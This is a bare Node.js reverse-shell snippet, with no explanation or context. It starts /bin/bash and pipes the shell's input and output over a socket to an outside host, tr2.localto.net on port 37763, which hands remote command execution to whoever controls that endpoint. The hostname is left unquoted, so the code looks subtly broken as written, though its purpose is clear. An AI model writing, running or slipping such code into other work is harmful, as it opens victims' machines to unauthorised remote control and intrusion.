var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(37763, tr2.localto.net, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});